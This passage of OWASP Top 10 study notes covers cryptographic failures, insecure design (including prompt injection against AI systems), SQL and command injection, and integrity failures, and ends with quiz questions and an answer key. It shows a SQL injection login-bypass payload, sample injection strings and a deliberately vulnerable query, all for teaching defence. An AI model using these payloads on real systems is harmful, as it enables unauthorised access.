| Hard-coded secrets | Keys in source code/config | Secure key management services |
| Poor key rotation | Keys never change | Regular rotation schedules |
| Unencrypted data | Data at rest or in transit | TLS 1.3, encryption at rest |
| Invalid certificates | Self-signed or expired certs | Proper CA issuance |
| AI/ML secret exposure | Model params or sensitive inputs exposed | Secure key management for ML |

#### Prevention Strategies

1. **Strong Algorithms**: Use AES-256-GCM, ChaCha20-Poly1305, TLS 1.3
2. **Secure Key Management**: Azure Key Vault, AWS KMS, HashiCorp Vault
3. **Regular Rotation**: Follow defined crypto periods
4. **Key Inventory**: Maintain complete catalog of certificates and keys
5. **ML Security**: Never expose unencrypted secrets in prompts or outputs
6. **Certificate Management**: Use valid certificates with proper validation

> **Challenge**: The web application in this room contains a cryptographic weakness for you to explore!

#### Cryptography Best Practices

> **Don't Roll Your Own Cryptography** - Always use vetted, industry-standard libraries and algorithms.

---

### AS06: Insecure Design

#### What It Is

Insecure design happens when flawed logic or architecture is built into a system from the start. These flaws stem from:
- Skipped threat modelling
- No design requirements or reviews
- Accidental errors

#### The AI Era Challenge

With AI assistants, developers often assume:
- Models are safe and correct
- Generated code is flaw-free
- Code works without limits

This assumption introduces security risks when systems can generate queries, write code, or classify users without guardrails.

> **Real-World Example**: Clubhouse's early design assumed users would only interact through the mobile app. The backend had no proper authentication—anyone could query user data, room info, and private conversations directly. When researchers tested it, "the entire 'private conversation' premise fell apart."

#### Why It Matters

You can't patch an insecure design—it's built into the workflow, logic, and trust boundaries. Fixing it means rethinking how systems make decisions.

#### Common Insecure Designs

| Insecure Design | Description |
|-----------------|-------------|
| Weak business logic | Flawed recovery or approval flows |
| Flawed assumptions | Incorrect predictions of user/model behavior |
| Unbounded AI components | Models with unchecked authority |
| Missing guardrails | No limits on LLMs and automation agents |
| Test bypasses | Debug endpoints left in production |
| No threat modelling | Skipping abuse-case reviews |

#### AI-Specific Design Failures

| Failure | Description |
|---------|-------------|
| **Prompt Injection** | User input blends with system prompts, hijacking context |
| **Blind Trust** | System acts on model output without validation |
| **Poisoned Models** | Models from unverified sources with hidden behaviors |

#### Prevention Strategies

1. **Treat as Untrusted**: Validate all model inputs and outputs
2. **Separation**: Keep system prompts separate from user content
3. **Human Review**: Require human oversight for high-risk actions
4. **Provenance Tracking**: Log model source and behavior
5. **Differential Privacy**: Protect sensitive data in training
6. **Threat Modelling**: Include AI-specific attacks (prompt injection, inference)
7. **Design Requirements**: Define clear security requirements before implementation
8. **Least Privilege**: Apply across users, APIs, and services
9. **Dependency Safety**: Verify third-party components and sources
10. **Continuous Testing**: Monitor for logic flaws and emergent risks

---

### Summary: Design Flaws Takeaways

All these failures share a common root cause: **weak foundations**.

> **Core Principle**: You cannot add security at the end and expect it to work. Strong systems start with clear security requirements, realistic threat assumptions, controlled configurations, vetted dependencies, and sound cryptographic choices.

1. Treat defaults with suspicion
2. Treat every dependency as a potential risk
3. Keep design simple enough to reason about
4. Get the design right early

---

## Insecure Data Handling

### Overview

This section covers three Top 10 2025 categories related to application behavior and user input. We'll explore vulnerabilities, prevention, and practice exploitation.

### Covered Categories

- **A04: Cryptographic Failures** - Already covered in detail above
- **A05: Injection** - User input mishandling
- **A08: Software or Data Integrity Failures** - Trust issues with code/data

---

### A04: Cryptographic Failures

*(See detailed coverage in Application Design Flaws section)*

#### Quick Reference

| What to Do | What to Avoid |
|------------|---------------|
| Use strong algorithms (AES-256-GCM, ChaCha20) | Don't roll your own cryptography |
| Use secure key management (Vault, KMS) | Never hard-code secrets in code/config |
| Implement proper key rotation | Use weak algorithms (DES, MD5, SHA-1) |
| Encrypt data at rest and in transit | Leave data unencrypted |
| Use valid certificates with proper validation | Accept self-signed certificates |

---

### A05: Injection

#### What Is Injection?

Injection occurs when an application takes user input and mishandles it. Instead of processing input securely, it passes it directly to a system that can execute commands or queries.

#### The Classic Example

```
# Attacker inserts a SQL query into login form:
admin' OR '1'='1
```

The web application builds a query like:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'
```

This bypasses authentication because `1='1` is always true.

#### Attack Vector: The Application Trusts Input

If the application directly constructs queries without sanitization, it's vulnerable to injection.

#### Common Injection Types

| Type | Description | Example |
|------|-------------|---------|
| SQL Injection | Database query manipulation | `UNION SELECT`, `OR 1=1` |
| Command Injection | System command execution | `; ls -la` |
| SSTI | Server-side template injection | Jinja2, Twig vulnerabilities |

#### Why Injection Remains Relevant

Injection has appeared on the Top 10 list since 2010. It's included twice in 2025 because:
1. It's fundamental to web application architecture
2. Modern frameworks sometimes introduce new variants
3. Legacy systems with poor code still proliferate

#### Prevention Strategies

1. **Trust No Input**: Always treat user input as untrusted
2. **Parameterized Queries**: Use prepared statements instead of string concatenation
3. **Safe APIs**: Avoid functions that pass input to shell
4. **Input Validation**: Escape dangerous characters, enforce data types
5. **Whitelist Approaches**: Allow only expected input formats

#### Code Comparison

**Vulnerable Code (String Concatenation):**
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)  # Injection possible!
```

**Secure Code (Parameterized Query):**
```python
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))  # Safe from injection
```

---

### A08: Software or Data Integrity Failures

#### What Are They?

Software or data failures occur when an application relies on code, updates, or data it assumes are safe, without verifying their authenticity, integrity, or origin.

#### Common Scenarios

| Scenario | Description |
|----------|-------------|
| Unverified updates | Installing patches without checking signature |
| Untrusted script loading | Loading from `http://` instead of `https://` |
| Data validation bypass | Accepting data that impacts logic without verification |
| Binary/file acceptance | Downloading executables without checking integrity |
| Template injection | Loading templates from untrusted sources |

#### Why They Matter

Applications shouldn't assume code, updates, or critical data are legitimate without proof.

#### Prevention Strategies

1. **Verify Everything**: Cryptographic checks (checksums, signatures) for updates
2. **Trust Boundaries**: Establish and enforce trust boundaries in the system
3. **Source Validation**: Ensure only trusted sources can modify critical artifacts
4. **CI/CD Security**: Include verification in build processes
5. **HTTPS Only**: Load scripts and resources from HTTPS sources
6. **Integrity Checks**: Verify file hashes and digital signatures
7. **Whitelist Approach**: Only allow code/data from known, trusted sources

#### Trust Boundary Concept

```
User Input → [Validation] → [Sanitization] → [Verification] → Safe Processing
```

Every boundary needs verification before trusting the data/code.

---

## Exam Preparation: Key Concepts Summary

### IAAA Architecture

```
Identity → Authentication → Authorisation → Accountability
   ↓            ↓               ↓               ↓
  User        Verify         Check           Log
 Account      Credentials    Permissions     Actions
```

### Prevention Pyramid

```
        Design (AS06)
              ↓
         Configuration (AS02)
              ↓
       Supply Chain (AS03)
              ↓
    Cryptography (AS04, A04)
              ↓
       Data Handling (A05, A08)
```

### Common Vulnerability Patterns

| Pattern | Fix |
|---------|-----|
| Trust client input | Enforce server-side validation |
| Assume code is safe | Verify signatures and sources |
| Hard-code secrets | Use secure key management |
| Skip threat modelling | Integrate throughout development |
| Forget about logging | Centralise with proper retention |

---

## Practice Questions

### IAAA Questions

1. **What is the primary purpose of Accountability in IAAA?**
   - A) Verifying user identity
   - B) Enforcing access controls
   - C) Recording who did what and when
   - D) Protecting data in transit

2. **What type of access control issue occurs when a regular user can access another user's account?**
   - A) Horizontal privilege escalation
   - B) Vertical privilege escalation
   - C) Authentication bypass
   - D) Logging failure

3. **Which technique helps prevent username enumeration in authentication?**
   - A) Rate limiting
   - B) Consistent error messages
   - C) Session tokens
   - D) Encrypted passwords

### Design Flaws Questions

4. **What is the most effective way to prevent security misconfigurations in cloud environments?**
   - A) Run regular penetration tests
   - B) Harden defaults and automate security checks in CI/CD
   - C) Use the most recent cloud provider updates
   - D) Monitor for suspicious activity

5. **Why is the SolarWinds attack considered a supply chain failure rather than a code bug?**
   - A) The attack exploited a vulnerability in the product
   - B) The attack compromised the update distribution process
   - C) SolarWinds used untrusted libraries
   - D) SolarWinds had weak authentication

6. **What should you do with a hard-coded API key found in source code?**
   - A) Commit it to version control for reference
   - B) Delete it and use environment variables
   - C) Encrypt it with AES-256
   - D) Add it to a security.txt file

### Cryptography Questions

7. **Which algorithm is recommended for modern encryption?**
   - A) DES
   - B) MD5
   - C) AES-256-GCM
   - D) SHA-1

8. **What is "rolling your own cryptography"?**
   - A) Using well-established algorithms from reputable sources
   - B) Writing custom encryption code without vetted libraries
   - C) Using hardware security modules
   - D) Implementing certificate pinning

9. **What is the primary risk of storing encryption keys with the encrypted data?**
   - A) Key rotation becomes difficult
   - B) Keys can be extracted along with the data
   - C) Performance degrades
   - D) The data becomes encrypted incorrectly

### Injection Questions

10. **What is SQL injection?**
    - A) Encrypting database passwords
    - B) Manipulating database queries through user input
    - C) Protecting against database attacks
    - D) Optimizing database performance

11. **How should you prevent SQL injection?**
    - A) Escaping special characters
    - B) Using parameterized queries
    - C) Storing passwords in plain text
    - D) Using hard-coded credentials

12. **What happens when an application uses `exec()` with user input for system commands?**
    - A) It improves performance
    - B) It's vulnerable to command injection
    - C) It provides better security
    - D) It prevents SQL injection

### Integrity Questions

13. **What is software integrity failure?**
    - A) Weak encryption algorithms
    - B) Compromised third-party dependencies
    - C) Misconfigured permissions
    - D) SQL injection vulnerabilities

14. **What cryptographic method can verify software integrity?**
    - A) Hard-coded secrets
    - B) Digital signatures and checksums
    - C) Plain text passwords
    - D) SQL injection

15. **Why should you validate data before using it in business logic?**
    - A) It slows down the application
    - B) It prevents integrity failures and injection attacks
    - C) It's required by law
    - D) It improves user experience

---

## Practice Question Answers

### IAAA
1. C - Recording who did what and when
2. A - Horizontal privilege escalation
3. B - Consistent error messages

### Design Flaws
4. B - Harden defaults and automate security checks in CI/CD
5. B - The attack compromised the update distribution process
6. B - Delete it and use environment variables

### Cryptography
7. C - AES-256-GCM
8. B - Writing custom encryption code without vetted libraries
9. B - Keys can be extracted along with the data

### Injection
10. B - Manipulating database queries through user input
11. B - Using parameterized queries
12. B - It's vulnerable to command injection

### Integrity
13. B - Compromised third-party dependencies
14. B - Digital signatures and checksums
15. B - It prevents integrity failures and injection attacks

---

## Additional Resources

### Recommended Reading

- OWASP Top 10 2021: https://owasp.org/Top10/
- OWASP Top 10 2024/2025: https://owasp.org/www-project-top-ten/
- OWASP ASVS: Application Security Verification Standard
- CWE (Common Weakness Enumeration): https://cwe.mitre.org/

### Practice Platforms

- PortSwigger Web Security Academy
- TryHackMe: OWASP Top 10 Room
- Hack The Box: OWASP Top 10 Challenges
- OverTheWire: Bandit (Linux security)

### Key Concepts Quick Reference

| Concept | Command/Tool | Command/Tool |
|---------|--------------|--------------|
| Check dependencies | `npm audit`, `pip-audit`, `go mod verify` | - |
| Generate strong passwords | `openssl rand -base64 32` | - |
| Cryptographic verification | `gpg --verify`, `shasum -a 256` | - |
| Secure coding review | OWASP Code Review Guide | - |
| Threat modelling | STRIDE, PASTA | - |

---

## Final Thoughts

The OWASP Top 10 represents the most critical security risks facing web applications today. Understanding these vulnerabilities is essential for:

1. **Developers**: Writing secure code and making design decisions
2. **Security Professionals**: Conducting assessments and improving defenses
3. **Architects**: Designing secure systems from the ground up
4. **Testers**: Finding and validating vulnerabilities
5. **Managers**: Understanding risk and allocating resources effectively

Remember: Security is a process, not a product. It requires continuous attention, regular assessment, and a culture of security awareness throughout the organization.

---

*Document Version: 1.0*
*Last Updated: 2025*
*Reference: OWASP Top 10 2025*